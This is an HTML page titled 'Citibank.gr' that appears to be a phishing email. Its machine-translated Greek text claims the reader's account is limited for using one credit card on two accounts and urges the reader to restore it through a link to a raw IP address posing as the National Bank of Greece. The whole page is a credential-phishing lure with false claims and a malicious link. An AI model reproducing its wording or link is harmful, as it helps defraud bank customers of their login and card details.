<html><head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
<meta name="ProgId" content="FrontPage.Editor.Document">

<title>Citibank.gr</title>
</head><body>


<p>
&nbsp;</p>
<p>
&nbsp;</p>
	<table id="texttable" style="width: 100%;">
		<tbody><tr valign="top">
			<td class="almost_half_cell">
			<div id="result_box" dir="ltr" style="font-family: monospace; font-size: 10pt;">
				&#922;&#955;&#949;&#953;&#963;&#953;&#956;&#945;&#964;&#959;&#962; &#964;&#969;&#957; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#969;&#957; &#954;&#945;&#953; &#960;&#949;&#961;&#953;&#959;&#961;&#953;&#950;&#959;&#957;&#964;&#945;&#962; &#964;&#951;&#957; &#960;&#961;&#959;&#963;&#946;&#945;&#963;&#951; &#963;&#964;&#959; 
				&#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959; <br>
				&#927; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959;&#962; &#963;&#945;&#962; &#949;&#967;&#949;&#953; Limited. &#917;&#956;&#949;&#953;&#962; &#960;&#959;&#965; &#945;&#957;&#945;&#952;&#949;&#969;&#961;&#951;&#952;&#951;&#954;&#949; &#960;&#961;&#959;&#963;&#966;&#945;&#964;&#945; 
				&#963;&#964;&#959;&#953;&#967;&#949;&#953;&#945; &#964;&#951;&#962; &#960;&#953;&#963;&#964;&#969;&#964;&#953;&#954;&#951;&#962; &#963;&#945;&#962; &#954;&#945;&#961;&#964;&#945;&#962;, &#954;&#945;&#953; &#966;&#945;&#953;&#957;&#949;&#964;&#945;&#953; &#959;&#964;&#953; 
				&#967;&#961;&#951;&#963;&#953;&#956;&#959;&#960;&#959;&#953;&#949;&#953;&#964;&#949; &#964;&#951;&#957; &#953;&#948;&#953;&#945; &#960;&#953;&#963;&#964;&#969;&#964;&#953;&#954;&#951; &#954;&#945;&#961;&#964;&#945; &#947;&#953;&#945; 2 &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959;&#965;&#962;. &#927;&#960;&#969;&#962; 
				&#956;&#960;&#959;&#961;&#949;&#953;&#964;&#949; &#957;&#945; &#948;&#953;&#945;&#946;&#945;&#963;&#949;&#964;&#949; &#954;&#945;&#953; &#956;&#945;&#962; User Agreement (&#964;&#956;&#951;&#956;&#945; 2.13) 
				&#948;&#951;&#956;&#953;&#959;&#965;&#961;&#947;&#953;&#945; &#960;&#959;&#955;&#955;&#945;&#960;&#955;&#969;&#957; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#969;&#957; &#949;&#953;&#957;&#945;&#953; &#945;&#965;&#963;&#964;&#951;&#961;&#945; &#945;&#960;&#945;&#947;&#959;&#961;&#949;&#965;&#956;&#949;&#957;&#951;. 
				&#917;&#953;&#963;&#964;&#949; &#964;&#969;&#961;&#945; &#954;&#945;&#955;&#949;&#953;&#964;&#945;&#953; &#957;&#945; &#960;&#945;&#961;&#945;&#963;&#967;&#949;&#953; &#960;&#955;&#951;&#961;&#959;&#966;&#959;&#961;&#953;&#949;&#962; &#963;&#967;&#949;&#964;&#953;&#954;&#945; &#956;&#949; &#964;&#959; 
				&#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959; &#963;&#945;&#962;. 
				National Bank of Grece &#952;&#945; &#948;&#953;&#949;&#961;&#949;&#965;&#957;&#951;&#963;&#949;&#953; &#964;&#959; &#952;&#949;&#956;&#945; &#947;&#961;&#951;&#947;&#959;&#961;&#945; &#954;&#945;&#953; &#945;&#957; &#951; 
				&#949;&#961;&#949;&#965;&#957;&#945; &#949;&#953;&#957;&#945;&#953; &#965;&#960;&#949;&#961; &#963;&#945;&#962;, &#952;&#945; &#945;&#960;&#959;&#954;&#945;&#964;&#945;&#963;&#964;&#951;&#963;&#949;&#953; &#964;&#959; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959; &#963;&#945;&#962;.</div>
			</td>
		</tr>
	</tbody></table>

<p>
&nbsp;</p>
<form id="text_form" method="post" style="margin-top: 0px; margin-bottom: 0px; padding-top: 0px; padding-bottom: 0px;" action="http://google.com/translate_t">
</form>
<p><font size="2" face="Arial">
<a target="_blank" href="http://209.178.221.61/nbg.gr/">&#922;&#945;&#957;&#964;&#949; &#954;&#955;&#953;&#954; &#949;&#948;&#969; &#947;&#953;&#945; &#957;&#945; &#949;&#960;&#945;&#957;&#945;&#966;&#949;&#961;&#949;&#964;&#949; &#964;&#959; &#955;&#959;&#947;&#945;&#961;&#953;&#945;&#963;&#956;&#959; &#963;&#945;&#962;</a></font></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
	<table id="texttable0" style="width: 100%;">
		<tbody><tr valign="top">
			<td class="almost_half_cell">
			<div id="result_box0" dir="ltr" style="font-family: monospace; font-size: 10pt;">
				&#913;&#965;&#964;&#959; &#949;&#953;&#957;&#945;&#953; &#949;&#957;&#945; &#956;&#951;&#957;&#965;&#956;&#945; &#960;&#959;&#965; &#948;&#951;&#956;&#953;&#959;&#965;&#961;&#947;&#959;&#965;&#957;&#964;&#945;&#953;</div>
			</td>
		</tr>
	</tbody></table>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
	<tbody><tr>
		<td colspan="4" valign="bottom">
</td>
	</tr>
	<tr>

	</tr>
	<tr>
		
	</tr>
</tbody></table>	

</body></html>

